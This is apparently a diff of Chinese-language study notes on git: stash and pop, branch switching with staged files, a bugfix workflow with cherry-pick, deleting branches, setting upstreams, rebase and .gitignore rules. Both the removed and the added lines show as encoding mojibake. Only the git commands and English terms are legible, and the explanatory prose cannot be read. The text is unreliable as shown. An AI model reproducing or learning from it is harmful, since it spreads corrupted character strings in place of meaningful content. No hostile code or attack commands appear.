+å½“ä½ git stashæ“ä½œçš„æ—¶å€™,æ— è®ºä½ å½“å‰åˆ†æ”¯ä¸‹çš„æ–‡ä»¶æ­¤æ—¶æœ‰æ²¡æœ‰è¿›è¡Œaddæ“ä½œ,åœ¨ä½ ä¿®å¤bugåŽåˆ‡å›žå½“å‰åˆ†æ”¯çš„æ—¶å€™éƒ½ä¼šæ˜¯åœ¨æš‚å­˜åŒºè¿˜æ²¡æœ‰addçš„çŠ¶æ€,ä½ éœ€è¦å†æ¬¡è¿›è¡Œaddå†commit,å¹¶ä¸”åœ¨ä½ stashä¹‹åŽæŸ¥çœ‹å†…å®¹æ˜¯ä½ æ²¡ä¿®æ”¹ä¹‹å‰çš„å†…å®¹,åªæœ‰å½“ä½ git stash pop(apply)æ‰ä¼šæ˜¾ç¤ºä½ ä¿®æ”¹ä¹‹åŽçš„å†…å®¹!
 
-¶ø¶ÔÓÚÒ»¸öÄãÐÂ½¨µÄÎÄ¼þ(¼´Ã»ÓÐ±»trackedµÄÎÄ¼þ)ÊÇÎÞ·¨×ö±£´æµÄ,stash²Ù×÷ÏÔÊ¾Ã»ÓÐ¿ÉÒÔ±£´æµÄ,²¢ÇÒµ±ÄãÇÐ»»µ½ÁíÍâÒ»¸ö·ÖÖ§µÄÊ±ºò,Õâ¸öÐÂ½¨µÄÎÄ¼þ»á³öÏÖÔÚÕâ¸ö·ÖÖ§ÏÂÃæ,¶øÈç¹ûÄãÔÚÕâ¸ö·ÖÖ§ÏÂÃæ×öadd²Ù×÷,ÄÇ¸ö´ËÊ±Õâ¸öÎÄ¼þ¾Í»áÊôÓÚÄãÕâ¸ö·ÖÖ§ÏÂÃæÁË,µ±ÄãÇÐ»ØÖ®Ç°µÄ·ÖÖ§,ÒÑ¾­²»»áÔÙÏÔÊ¾µ±Ç°Õâ¸öÐÂ½¨µÄÎÄ¼þÁË
+è€Œå¯¹äºŽä¸€ä¸ªä½ æ–°å»ºçš„æ–‡ä»¶(å³æ²¡æœ‰è¢«trackedçš„æ–‡ä»¶)æ˜¯æ— æ³•åšä¿å­˜çš„,stashæ“ä½œæ˜¾ç¤ºæ²¡æœ‰å¯ä»¥ä¿å­˜çš„,å¹¶ä¸”å½“ä½ åˆ‡æ¢åˆ°å¦å¤–ä¸€ä¸ªåˆ†æ”¯çš„æ—¶å€™,è¿™ä¸ªæ–°å»ºçš„æ–‡ä»¶ä¼šå‡ºçŽ°åœ¨è¿™ä¸ªåˆ†æ”¯ä¸‹é¢,è€Œå¦‚æžœä½ åœ¨è¿™ä¸ªåˆ†æ”¯ä¸‹é¢åšaddæ“ä½œ,é‚£ä¸ªæ­¤æ—¶è¿™ä¸ªæ–‡ä»¶å°±ä¼šå±žäºŽä½ è¿™ä¸ªåˆ†æ”¯ä¸‹é¢äº†,å½“ä½ åˆ‡å›žä¹‹å‰çš„åˆ†æ”¯,å·²ç»ä¸ä¼šå†æ˜¾ç¤ºå½“å‰è¿™ä¸ªæ–°å»ºçš„æ–‡ä»¶äº†
 
-µ±Äã¶ÔÒ»¸öÐÂ½¨µÄÎÄ¼þ½øÐÐÁËadd»¹ÓÐcommit²Ù×÷È»ºóÔÙ±£´æ,ÄÇÃ´ÄãstashÖ®ºóÕâ¸öÎÄ¼þ»áÏûÊ§,µÈÄãÇÐ»ØÀ´Õâ¸ö·ÖÖ§,²¢ÇÒpop³öÀ´µÄÊ±ºò,ÎÄ¼þ»áÏÔÊ¾Õý³£²¢ÇÒ´ËÊ±ÎÄ¼þÎ»ÓÚÔÝ´æÇøÒ²¾ÍÊÇ´¦ÔÚaddÖ®ºóµÄ×´Ì¬,ÄãÖ»ÐèÒªcommit¾ÍÐÐ
+å½“ä½ å¯¹ä¸€ä¸ªæ–°å»ºçš„æ–‡ä»¶è¿›è¡Œäº†addè¿˜æœ‰commitæ“ä½œç„¶åŽå†ä¿å­˜,é‚£ä¹ˆä½ stashä¹‹åŽè¿™ä¸ªæ–‡ä»¶ä¼šæ¶ˆå¤±,ç­‰ä½ åˆ‡å›žæ¥è¿™ä¸ªåˆ†æ”¯,å¹¶ä¸”popå‡ºæ¥çš„æ—¶å€™,æ–‡ä»¶ä¼šæ˜¾ç¤ºæ­£å¸¸å¹¶ä¸”æ­¤æ—¶æ–‡ä»¶ä½äºŽæš‚å­˜åŒºä¹Ÿå°±æ˜¯å¤„åœ¨addä¹‹åŽçš„çŠ¶æ€,ä½ åªéœ€è¦commitå°±è¡Œ
 
-¶ÔÓÚÇÐ»»,Èç¹ûÄãÖ»ÊÇÐÂ½¨Ò»¸öÎÄ¼þ²¢ÇÒÃ»ÓÐaddÄÇÃ´Ëæ±ãÇÐ»»ÄÄ¸ö·ÖÖ§¶¼Ã»ÊÂ,Èç¹ûÄãÐÂ½¨Ò»¸öÎÄ¼þ²¢ÇÒaddÁË,ÄÇÃ´ÄãÖ»ÄÜÇÐ»»µ½ºÍÄãÒ»ÑùµÄcommitÄÚÈÝµÄ·ÖÖ§,²»ÄÜÇÐ»»µ½¸úÄã²»Ò»ÑùµÄ·ÖÖ§,¾Ù¸öÀý×Ó,ÎÒÏÖÔÚÔÚmasterÉÏÃæÐÂ½¨Ò»¸ö·ÖÖ§xiaodu,ÄÇÃ´xiaoduµÄÄÚÈÝºÍmasterÊÇÒ»ÑùµÄ,È»ºóÎÒÐÂ½¨Ò»¸öÎÄ¼þ²¢ÇÒaddÁË,ÄÇÃ´ÎÒ´ËÊ±ÇÐ»»µ½masterÏÂÃæ,ÎÒgit status»á·¢ÏÖÓÐÒ»¸öÔÚ»º´æÇøµÄÐÂÎÄ¼þ,´ËÊ±Èç¹ûÎÒcommit»á·¢ÏÖÖ±½Ó³É¹¦,ÔÙÇÐ»»µ½xiaoduxÏÂÃæ,ÄÇÃ´ÏÂÃæÃ»ÓÐÕâ¸öÐÂ½¨µÄÎÄ¼þÁË,ÕâÀï½¨ÒéÈ¥ÓÃÖ¸ÕëÀí½â±È½ÏºÃÀí½â!(masterºÍxiaoduxÖ¸ÏòÍ¬Ò»¸öµØ·½,È»ºóÄØ,ÄãÔÙxiaoduxÀïÃæ½øÐÐaddÖ»ÊÇ·ÅÔÚstageÇø,²¢²»ÔÚ×Ô¼ºµÄ¹¤×÷ÇøÒ²¾ÍÊÇÃ»ÓÐÍùÇ°Ãæ×ßÒ»²½,ÄÇÃ´ÎÒmasterÀïÃæÖ±½ÓÌá½»Ïàµ±ÓÚÖ±½ÓÍùÇ°×ßÁËÒ»²½µÄ)
+å¯¹äºŽåˆ‡æ¢,å¦‚æžœä½ åªæ˜¯æ–°å»ºä¸€ä¸ªæ–‡ä»¶å¹¶ä¸”æ²¡æœ‰addé‚£ä¹ˆéšä¾¿åˆ‡æ¢å“ªä¸ªåˆ†æ”¯éƒ½æ²¡äº‹,å¦‚æžœä½ æ–°å»ºä¸€ä¸ªæ–‡ä»¶å¹¶ä¸”addäº†,é‚£ä¹ˆä½ åªèƒ½åˆ‡æ¢åˆ°å’Œä½ ä¸€æ ·çš„commitå†…å®¹çš„åˆ†æ”¯,ä¸èƒ½åˆ‡æ¢åˆ°è·Ÿä½ ä¸ä¸€æ ·çš„åˆ†æ”¯,ä¸¾ä¸ªä¾‹å­,æˆ‘çŽ°åœ¨åœ¨masterä¸Šé¢æ–°å»ºä¸€ä¸ªåˆ†æ”¯xiaodu,é‚£ä¹ˆxiaoduçš„å†…å®¹å’Œmasteræ˜¯ä¸€æ ·çš„,ç„¶åŽæˆ‘æ–°å»ºä¸€ä¸ªæ–‡ä»¶å¹¶ä¸”addäº†,é‚£ä¹ˆæˆ‘æ­¤æ—¶åˆ‡æ¢åˆ°masterä¸‹é¢,æˆ‘git statusä¼šå‘çŽ°æœ‰ä¸€ä¸ªåœ¨ç¼“å­˜åŒºçš„æ–°æ–‡ä»¶,æ­¤æ—¶å¦‚æžœæˆ‘commitä¼šå‘çŽ°ç›´æŽ¥æˆåŠŸ,å†åˆ‡æ¢åˆ°xiaoduxä¸‹é¢,é‚£ä¹ˆä¸‹é¢æ²¡æœ‰è¿™ä¸ªæ–°å»ºçš„æ–‡ä»¶äº†,è¿™é‡Œå»ºè®®åŽ»ç”¨æŒ‡é’ˆç†è§£æ¯”è¾ƒå¥½ç†è§£!(masterå’ŒxiaoduxæŒ‡å‘åŒä¸€ä¸ªåœ°æ–¹,ç„¶åŽå‘¢,ä½ å†xiaoduxé‡Œé¢è¿›è¡Œaddåªæ˜¯æ”¾åœ¨stageåŒº,å¹¶ä¸åœ¨è‡ªå·±çš„å·¥ä½œåŒºä¹Ÿå°±æ˜¯æ²¡æœ‰å¾€å‰é¢èµ°ä¸€æ­¥,é‚£ä¹ˆæˆ‘masteré‡Œé¢ç›´æŽ¥æäº¤ç›¸å½“äºŽç›´æŽ¥å¾€å‰èµ°äº†ä¸€æ­¥çš„)
 
-¼ÙÈçÎÒÃÇÔÚmasterÉÏÃæÓÐ¸öbug,ÎÒÕýÔÚdevÉÏÃæ¿ª·¢,ÎÒÕâ¸öÊ±ºò¾ÍÏÈ°ÑÊÖÉÏÕýÔÚÐÞ¸ÄµÄÄÚÈÝ½øÐÐstash´¦Àí,È»ºóÇÐµ½master,ÔÙÔÚmasterÉÏÐÂ½¨Ò»¸ö·ÖÖ§¾Í½Ðfixbug°É,ÎÒÃÇÔÚfixbugÉÏÃæÐÞ¸´ºÃÁËbug,ÇÐ»Ømaster,ÈÃmasterºÏ²¢fixbugÈ»ºóÉ¾µôfixbug·ÖÖ§.ÒòÎªÎÒÃÇdevÒ²ÊÇ´ÓmasterÉÏÃæ½¨µÄ,ÄÇÃ´devÉÏÃæÓÐ¿ÉÄÜÒ²ÓÐÕâ¸öbug,È»ºóÎÒÃÇ¾ÍÇÐ»Ødev,ÕâÊ±ºò»¹¼ÇµÃÎÒÃÇ¸Õ²ÅµÄstashÂð,ÎÒ½¨ÒéÏÈ²»Òªpop³öÀ´,ÒòÎª¼ÙÈçÄãÐÞ¸´µÄbugÎÄ¼þ,ºÍÄã¸Õ²Å±£´æµÄÎÄ¼þÊÇÍ¬¸öÎÄ¼þ,ÄÇÃ´ÕâÊ±ºò¾Í¿ÉÄÜÓÐ³åÍ»,ÄãÈ¥cherry-pickµÄÊ±ºò¾Í»á±¨´í.²Ù×÷ÎÞ·¨½øÐÐ,½¨ÒéÏÈcherry-pick È»ºóÔÙÈ¥pop³öÀ´,ÕâÑùËäÈ»ÀïÃæÄÚÈÝÓÐ³åÍ»,µ«ÊÇÄã¿ÉÒÔ½øÐÐÐÞ¸Ä²»»á±¨´í!µ±È»ÒªÊÇÃ»ÓÐÏàÍ¬µÄÎÄ¼þ,ÄÇÃ´×ÔÈ»¶øÈ»Ë³Ðò¾ÍÎÞËùÎ½ÁË
+å‡å¦‚æˆ‘ä»¬åœ¨masterä¸Šé¢æœ‰ä¸ªbug,æˆ‘æ­£åœ¨devä¸Šé¢å¼€å‘,æˆ‘è¿™ä¸ªæ—¶å€™å°±å…ˆæŠŠæ‰‹ä¸Šæ­£åœ¨ä¿®æ”¹çš„å†…å®¹è¿›è¡Œstashå¤„ç†,ç„¶åŽåˆ‡åˆ°master,å†åœ¨masterä¸Šæ–°å»ºä¸€ä¸ªåˆ†æ”¯å°±å«fixbugå§,æˆ‘ä»¬åœ¨fixbugä¸Šé¢ä¿®å¤å¥½äº†bug,åˆ‡å›žmaster,è®©masteråˆå¹¶fixbugç„¶åŽåˆ æŽ‰fixbugåˆ†æ”¯.å› ä¸ºæˆ‘ä»¬devä¹Ÿæ˜¯ä»Žmasterä¸Šé¢å»ºçš„,é‚£ä¹ˆdevä¸Šé¢æœ‰å¯èƒ½ä¹Ÿæœ‰è¿™ä¸ªbug,ç„¶åŽæˆ‘ä»¬å°±åˆ‡å›ždev,è¿™æ—¶å€™è¿˜è®°å¾—æˆ‘ä»¬åˆšæ‰çš„stashå—,æˆ‘å»ºè®®å…ˆä¸è¦popå‡ºæ¥,å› ä¸ºå‡å¦‚ä½ ä¿®å¤çš„bugæ–‡ä»¶,å’Œä½ åˆšæ‰ä¿å­˜çš„æ–‡ä»¶æ˜¯åŒä¸ªæ–‡ä»¶,é‚£ä¹ˆè¿™æ—¶å€™å°±å¯èƒ½æœ‰å†²çª,ä½ åŽ»cherry-pickçš„æ—¶å€™å°±ä¼šæŠ¥é”™.æ“ä½œæ— æ³•è¿›è¡Œ,å»ºè®®å…ˆcherry-pick ç„¶åŽå†åŽ»popå‡ºæ¥,è¿™æ ·è™½ç„¶é‡Œé¢å†…å®¹æœ‰å†²çª,ä½†æ˜¯ä½ å¯ä»¥è¿›è¡Œä¿®æ”¹ä¸ä¼šæŠ¥é”™!å½“ç„¶è¦æ˜¯æ²¡æœ‰ç›¸åŒçš„æ–‡ä»¶,é‚£ä¹ˆè‡ªç„¶è€Œç„¶é¡ºåºå°±æ— æ‰€è°“äº†
 
-¶ÔÓÚgit branch -d²Ù×÷Èç¹ûÄãÔÚmasterÉÏÃæÐÂ½¨µÄ·ÖÖ§ÀïÃæÐÂ½¨ÁËÒ»¸öÄÚÈÝµ«ÊÇ»¹Ã»ÓÐcommit,ÄÇÃ´ÄãÊÇ¿ÉÒÔËæÒâÔÚmasterÉÏÉ¾µôÕâ¸ö·ÖÖ§µÄ,¶øÈç¹ûÄã´´½¨ÁË²¢ÇÒcommitÁË(ÎÞÂÛÄÚÈÝÊÇ·ñÎª¿Õ),ÄÇÃ´ÄãÈ¥-dµÄÊ±ºò»áÌáÐÑÄã»¹Ã»ÓÐºÏ²¢ÎÞ·¨É¾³ý,´ËÊ±¿ÉÒÔÓÃ-DÀ´½øÐÐÉ¾³ý
+å¯¹äºŽgit branch -dæ“ä½œå¦‚æžœä½ åœ¨masterä¸Šé¢æ–°å»ºçš„åˆ†æ”¯é‡Œé¢æ–°å»ºäº†ä¸€ä¸ªå†…å®¹ä½†æ˜¯è¿˜æ²¡æœ‰commit,é‚£ä¹ˆä½ æ˜¯å¯ä»¥éšæ„åœ¨masterä¸Šåˆ æŽ‰è¿™ä¸ªåˆ†æ”¯çš„,è€Œå¦‚æžœä½ åˆ›å»ºäº†å¹¶ä¸”commitäº†(æ— è®ºå†…å®¹æ˜¯å¦ä¸ºç©º),é‚£ä¹ˆä½ åŽ»-dçš„æ—¶å€™ä¼šæé†’ä½ è¿˜æ²¡æœ‰åˆå¹¶æ— æ³•åˆ é™¤,æ­¤æ—¶å¯ä»¥ç”¨-Dæ¥è¿›è¡Œåˆ é™¤
 
 
-git push origin <branch>À´ÍÆËÍ·ÖÖ§,´ËÊ±ËäÈ»·ÖÖ§ÒÑ¾­ÔÚÔ¶³Ì²Ö¿âÁË,µ«ÊÇÄã²¢Ã»ÓÐÓëÆä½¨Á¢ÁªÏµ,Äã½øÐÐpull²Ù×÷²¢²»ÄÜ½«ÆäÄÚÈÝÀ­ÏÂÀ´!´ËÊ±¾ÍÐèÒªÓëÔ¶³Ì·ÖÖ§½¨Á¢Á¬½Ó
-µ«ÊÇÄãÒ²¿ÉÒÔ½øÐÐpushµÄÊ±ºòÖ±½Ó½¨Á¢Á¬½Ó,ÄÇ¾ÍÊÇgit push --set-upstream origin <branch>
-git branch --set-upstream-to=origin/<branch> newdev ½«±¾µØ·ÖÖ§ÓëÔ¶³Ì·ÖÖ§½¨Á¢Á¬½Ó
+git push origin <branch>æ¥æŽ¨é€åˆ†æ”¯,æ­¤æ—¶è™½ç„¶åˆ†æ”¯å·²ç»åœ¨è¿œç¨‹ä»“åº“äº†,ä½†æ˜¯ä½ å¹¶æ²¡æœ‰ä¸Žå…¶å»ºç«‹è”ç³»,ä½ è¿›è¡Œpullæ“ä½œå¹¶ä¸èƒ½å°†å…¶å†…å®¹æ‹‰ä¸‹æ¥!æ­¤æ—¶å°±éœ€è¦ä¸Žè¿œç¨‹åˆ†æ”¯å»ºç«‹è¿žæŽ¥
+ä½†æ˜¯ä½ ä¹Ÿå¯ä»¥è¿›è¡Œpushçš„æ—¶å€™ç›´æŽ¥å»ºç«‹è¿žæŽ¥,é‚£å°±æ˜¯git push --set-upstream origin <branch>
+git branch --set-upstream-to=origin/<branch> newdev å°†æœ¬åœ°åˆ†æ”¯ä¸Žè¿œç¨‹åˆ†æ”¯å»ºç«‹è¿žæŽ¥
 
-ÒªÏëÔÚ±¾µØ´´½¨ÓëÔ¶³Ì·ÖÖ§Ò»ÑùµÄ·ÖÖ§¸ÃÔõÃ´×ö?(´´½¨µÄÊ±ºòÆäÊµÒ²»áÖ±½ÓÓëÔ¶³Ì·ÖÖ§½øÐÐÁ¬½ÓÁË)
-Ê¹ÓÃgit switch -c <branch> origin/<branch>£¬±¾µØºÍÔ¶³Ì·ÖÖ§µÄÃû³Æ×îºÃÒ»ÖÂ
+è¦æƒ³åœ¨æœ¬åœ°åˆ›å»ºä¸Žè¿œç¨‹åˆ†æ”¯ä¸€æ ·çš„åˆ†æ”¯è¯¥æ€Žä¹ˆåš?(åˆ›å»ºçš„æ—¶å€™å…¶å®žä¹Ÿä¼šç›´æŽ¥ä¸Žè¿œç¨‹åˆ†æ”¯è¿›è¡Œè¿žæŽ¥äº†)
+ä½¿ç”¨git switch -c <branch> origin/<branch>ï¼Œæœ¬åœ°å’Œè¿œç¨‹åˆ†æ”¯çš„åç§°æœ€å¥½ä¸€è‡´
 
-ÇÐ»»·ÖÖ§µ½ÐèÒªrebaseµÄ·ÖÖ§£¬ÕâÀïÊÇdev·ÖÖ§
+åˆ‡æ¢åˆ†æ”¯åˆ°éœ€è¦rebaseçš„åˆ†æ”¯ï¼Œè¿™é‡Œæ˜¯devåˆ†æ”¯
 
-Ö´ÐÐgit rebase master£¬ÓÐ³åÍ»¾Í½â¾ö³åÍ»£¬½â¾öºóÖ±½Ógit add . ÔÙgit rebase --continue¼´¿É
+æ‰§è¡Œgit rebase masterï¼Œæœ‰å†²çªå°±è§£å†³å†²çªï¼Œè§£å†³åŽç›´æŽ¥git add . å†git rebase --continueå³å¯
 
-ÃüÁîÐÐÊäÈëtouch .gitignore
-Éú³É .gitignore ÎÄ¼þ£»
-ÔÚÎÄ¼þÖÐÊäÈë¹ýÂËÐÅÏ¢£¬¹ýÂË¹æÔòÈçÏÂ£º
-node_modules/   ±íÊ¾¹ýÂËÕâ¸öÎÄ¼þ¼Ð
-*.zip   ¹ýÂËzipºó×ºÎÄ¼þ
-demo.html   ¹ýÂË¸ÃÎÄ¼þ
+å‘½ä»¤è¡Œè¾“å…¥touch .gitignore
+ç”Ÿæˆ .gitignore æ–‡ä»¶ï¼›
+åœ¨æ–‡ä»¶ä¸­è¾“å…¥è¿‡æ»¤ä¿¡æ¯ï¼Œè¿‡æ»¤è§„åˆ™å¦‚ä¸‹ï¼š
+node_modules/   è¡¨ç¤ºè¿‡æ»¤è¿™ä¸ªæ–‡ä»¶å¤¹
+*.zip   è¿‡æ»¤zipåŽç¼€æ–‡ä»¶
+demo.html   è¿‡æ»¤è¯¥æ–‡ä»¶
+
 
